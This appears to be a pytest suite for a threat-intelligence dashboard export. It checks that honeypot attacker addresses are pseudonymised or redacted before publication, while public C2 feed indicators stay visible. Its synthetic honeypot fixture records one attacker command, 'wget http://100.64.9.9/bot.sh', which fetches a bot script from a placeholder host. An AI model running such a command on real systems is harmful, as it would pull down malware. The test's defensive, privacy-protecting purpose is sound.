"""Tests for the public dashboard export.

The warehouse is an in-memory DuckDB with synthetic rows in the real table
shapes. Honeypot addresses are from 100.64.0.0/10; the point of several tests
is that none of them can reach a published file.
"""

from __future__ import annotations

import json
import re
from datetime import date, datetime, timezone
from pathlib import Path

import duckdb
import pytest

from aegis.publish.export import PublishError, export

KEY = b"k" * 32
SITE = Path(__file__).resolve().parents[1] / "site"
NOW = datetime(2026, 9, 15, 5, 30, tzinfo=timezone.utc)


def feeds_warehouse() -> duckdb.DuckDBPyConnection:
    con = duckdb.connect()
    for schema in ("silver", "gold", "ml"):
        con.execute(f"CREATE SCHEMA {schema}")
    con.execute(
        "CREATE TABLE silver.kev_vulnerabilities AS SELECT * FROM (VALUES "
        "('CVE-2026-0001', 'Microsoft', true), ('CVE-2026-0002', 'Microsoft', false), "
        "('CVE-2026-0003', 'Fortinet', false)) t(cve_id, vendor, is_ransomware_linked)"
    )
    con.execute(
        "CREATE TABLE silver.urlhaus_urls AS SELECT * FROM (VALUES "
        "('http://a.test/x', 'a.test', true), ('http://a.test/y', 'a.test', false)) "
        "t(url, host, is_online)"
    )
    con.execute("CREATE TABLE silver.feodo_c2_servers AS SELECT 1 AS n")
    con.execute(
        "CREATE TABLE silver.tor_exit_nodes AS SELECT * FROM (VALUES (true), (false)) t(is_current_exit)"
    )
    con.execute(
        "CREATE TABLE gold.vendor_exploitation AS SELECT 'Microsoft' AS vendor, 2 AS exploited_cves, "
        "1 AS ransomware_linked_cves, CAST(50.0 AS DECIMAL(4,1)) AS ransomware_share_pct, "
        "1 AS products_affected, DATE '2026-09-01' AS most_recently_added"
    )
    con.execute(
        "CREATE TABLE gold.malware_url_tags AS SELECT 'mozi' AS tag, 2 AS urls, 1 AS online_urls, "
        "1 AS distinct_hosts, 2.0 AS urls_per_host"
    )
    con.execute(
        "CREATE TABLE gold.c2_infrastructure AS SELECT '192.0.2.10' AS ip_address, 'QakBot' AS malware, "
        "true AS is_online, 443 AS port, 'Example AS' AS as_name, 'ZZ' AS country, "
        "'other' AS hosting_type, false AS was_ever_tor_exit, false AS is_current_tor_exit, "
        "TIMESTAMP '2026-09-01 10:00:00' AS first_seen, DATE '2026-09-14' AS last_online"
    )
    con.execute(
        "CREATE TABLE ml.url_campaigns AS SELECT 0 AS campaign_id, 23 AS servers, 350 AS urls, "
        "12 AS online_urls, 4 AS distinct_subnets, ['mirai'] AS top_tags, ['i'] AS top_paths"
    )
    con.execute("CREATE TABLE ml.url_campaign_servers AS SELECT 'a.test' AS host")
    con.execute(
        "CREATE TABLE ml.kev_ransomware_scores AS SELECT 1 AS watchlist_rank, 'CVE-2026-0003' AS cve_id, "
        "'Fortinet' AS vendor, 'FortiOS' AS product, 'Auth bypass' AS vulnerability_name, "
        "DATE '2026-03-01' AS date_added, 0.81 AS ransomware_probability, true AS on_watchlist"
    )
    return con


def add_honeypot(con: duckdb.DuckDBPyConnection) -> None:
    con.execute(
        "CREATE TABLE silver.honeypot_sessions AS SELECT * FROM (VALUES "
        "('s1', '100.64.0.10', TIMESTAMPTZ '2026-09-14 21:00:00+00', 'ssh', true, 2, 1, "
        "'wget http://100.64.9.9/bot.sh'), "
        "('s2', '100.64.0.11', TIMESTAMPTZ '2026-09-14 22:00:00+00', 'telnet', false, 0, 0, NULL)) "
        "t(session_id, src_ip, started_at, protocol, login_succeeded, commands_run, downloads, first_command)"
    )
    con.execute(
        "CREATE TABLE silver.honeypot_events AS SELECT * FROM (VALUES "
        "('cowrie.login.success', 'root', 'admin'), ('cowrie.login.failed', 'admin', '100.64.3.3')) "
        "t(eventid, username, password)"
    )
    con.execute(
        "CREATE TABLE ml.honeypot_session_anomalies AS SELECT 1 AS anomaly_rank, '100.64.0.10' AS src_ip, "
        "TIMESTAMPTZ '2026-09-14 21:00:00+00' AS started_at, 'ssh' AS protocol, "
        "'first command seen from 100.64.9.9' AS reasons, 2 AS commands_run, 1 AS downloads, true AS is_flagged"
    )


def read(out: Path, name: str) -> object:
    return json.loads((out / f"{name}.json").read_text(encoding="utf-8"))


class TestFeedsExport:
    def test_writes_every_file_the_site_requests(self, tmp_path: Path) -> None:
        """The contract between the export and site/app.js: no request may 404."""
        result = export(feeds_warehouse(), tmp_path, now=NOW)
        requested = re.search(
            r"const FILES = \[([^\]]*)\]", (SITE / "app.js").read_text(encoding="utf-8")
        )
        assert requested is not None, "site/app.js must declare const FILES = [...]"
        names = re.findall(r'"([a-z_]+)"', requested.group(1))
        assert names, "no file names found in FILES"
        for name in names:
            assert f"{name}.json" in result.files

    def test_summary_counts(self, tmp_path: Path) -> None:
        export(feeds_warehouse(), tmp_path, now=NOW, commit="abc1234")
        summary = read(tmp_path, "summary")
        assert isinstance(summary, dict)
        assert summary["generated_at"] == NOW.isoformat()
        assert summary["commit"] == "abc1234"
        counts = summary["counts"]
        assert counts["exploited_cves"] == 3
        assert counts["ransomware_linked_cves"] == 1
        assert counts["malware_hosts"] == 1
        assert counts["tor_exit_nodes"] == 1
        assert counts["honeypot_sessions"] is None

    def test_dates_and_decimals_become_json(self, tmp_path: Path) -> None:
        export(feeds_warehouse(), tmp_path, now=NOW)
        vendor = read(tmp_path, "vendors")[0]  # type: ignore[index]
        assert vendor["most_recently_added"] == "2026-09-01"
        assert vendor["ransomware_share_pct"] == 50.0

    def test_honeypot_is_marked_unavailable_without_a_sensor(self, tmp_path: Path) -> None:
        export(feeds_warehouse(), tmp_path, now=NOW)
        assert read(tmp_path, "honeypot") == {"available": False}

    def test_missing_tables_export_empty_not_crash(self, tmp_path: Path) -> None:
        result = export(duckdb.connect(), tmp_path, now=NOW)
        assert read(tmp_path, "vendors") == []
        assert result.honeypot_available is False


class TestHoneypotExport:
    def test_refuses_without_a_key_and_writes_nothing(self, tmp_path: Path) -> None:
        con = feeds_warehouse()
        add_honeypot(con)
        with pytest.raises(PublishError, match="PSEUDONYMISATION_KEY"):
            export(con, tmp_path, now=NOW)
        assert list(tmp_path.iterdir()) == []

    def test_no_attacker_address_reaches_any_file(self, tmp_path: Path) -> None:
        con = feeds_warehouse()
        add_honeypot(con)
        export(con, tmp_path, key=KEY, now=NOW)
        text = (tmp_path / "honeypot.json").read_text(encoding="utf-8")
        for address in ("100.64.0.10", "100.64.0.11", "100.64.9.9", "100.64.3.3"):
            assert address not in text

    def test_flagged_sessions_carry_a_stable_pseudonym(self, tmp_path: Path) -> None:
        con = feeds_warehouse()
        add_honeypot(con)
        export(con, tmp_path, key=KEY, now=NOW)
        honeypot = read(tmp_path, "honeypot")
        assert isinstance(honeypot, dict) and honeypot["available"] is True
        flagged = honeypot["flagged_sessions"][0]
        assert flagged["source"].startswith("anon-")
        assert "src_ip" not in flagged
        assert "[ip]" in flagged["reasons"]
        assert honeypot["overview"]["sessions"] == 2

    def test_redacts_addresses_typed_as_commands_and_passwords(self, tmp_path: Path) -> None:
        con = feeds_warehouse()
        add_honeypot(con)
        export(con, tmp_path, key=KEY, now=NOW)
        honeypot = read(tmp_path, "honeypot")
        assert isinstance(honeypot, dict)
        assert honeypot["top_first_commands"][0]["value"] == "wget http://[ip]/bot.sh"
        assert {"value": "[ip]", "attempts": 1} in honeypot["top_passwords"]


class TestFeedIndicatorsStayPublic:
    def test_published_c2_addresses_are_not_pseudonymised(self, tmp_path: Path) -> None:
        """Feodo publishes C2 addresses for blocking; hiding them would make the table useless."""
        export(feeds_warehouse(), tmp_path, now=NOW)
        assert read(tmp_path, "c2")[0]["ip_address"] == "192.0.2.10"  # type: ignore[index]


def test_date_type_is_serialisable() -> None:
    from aegis.publish.export import _json_default

    assert _json_default(date(2026, 9, 15)) == "2026-09-15"
